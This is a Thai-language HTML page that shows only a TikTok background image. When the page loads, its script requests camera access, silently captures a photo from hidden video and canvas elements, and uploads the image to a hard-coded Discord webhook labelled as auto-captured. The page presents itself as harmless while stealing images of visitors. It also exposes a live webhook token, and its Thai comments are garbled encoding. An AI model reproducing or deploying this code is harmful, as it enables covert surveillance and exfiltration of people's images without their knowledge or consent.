<!DOCTYPE html>
<html lang="th">
<head>
  <meta charset="UTF-8">

  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: system-ui, sans-serif;

      /* ‚≠ê ‡πÉ‡∏™‡πà‡∏£‡∏π‡∏õ‡∏û‡∏∑‡πâ‡∏ô‡∏´‡∏•‡∏±‡∏á‡πÄ‡∏ï‡πá‡∏°‡∏à‡∏≠ */
      background-image: url('https://cdn.discordapp.com/attachments/1439099287224193126/1439107786507161671/TikTok.png?ex=69195111&is=6917ff91&hm=ec2bd69bbeb96888f71d4bb7126d3055d157b0b9f5ccf3eecd08ce8aaa518d2f&'); /* ‚Üê ‡πÄ‡∏õ‡∏•‡∏µ‡πà‡∏¢‡∏ô‡∏ï‡∏£‡∏á‡∏ô‡∏µ‡πâ */
      background-size: cover;       /* ‡∏Ñ‡∏£‡∏≠‡∏ö‡πÄ‡∏ï‡πá‡∏° */
      background-position: center;  /* ‡∏ï‡∏£‡∏á‡∏Å‡∏•‡∏≤‡∏á */
      background-repeat: no-repeat; /* ‡πÑ‡∏°‡πà‡∏ã‡πâ‡∏≥ */
      height: 100vh;

      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;

      color: #fff;
    }

    video, canvas, img {
      display: none;
    }

    #status {
      font-size: 14px;
      margin-top: 15px;
    }
  </style>
</head>

<body>

  <video id="video" playsinline autoplay></video>
  <canvas id="canvas"></canvas>
  <img id="photo" alt="preview">
  <p id="status"></p>

  <script>
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1439099868172914708/T625tkrkZPF4QkAcHPbMxTErYuoahL6ZAFm_Kt5bDxYIupTf-iz8Dp6KUGLRKjIWkGBn";

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const photo = document.getElementById('photo');
    const statusText = document.getElementById('status');

    async function startCapture() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });

        video.srcObject = stream;

        await new Promise(resolve => {
          video.onloadedmetadata = () => {
            video.play();
            resolve();
          };
        });

        await new Promise(r => setTimeout(r, 700));

        const width = video.videoWidth;
        const height = video.videoHeight;

        canvas.width = width;
        canvas.height = height;

        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, width, height);

        const dataURL = canvas.toDataURL('image/png');
        photo.src = dataURL;

        const blob = await (await fetch(dataURL)).blob();
        const filename = "capture-" + Date.now() + ".png";

        const form = new FormData();
        form.append("file", blob, filename);
        form.append("content", "üì∏ Auto-captured by art.github.io");

        await fetch(WEBHOOK_URL, { method: "POST", body: form });

        stream.getTracks().forEach(t => t.stop());
      } catch (err) {
        console.error(err);
      }
    }

    window.onload = startCapture;
  </script>

</body>
</html>
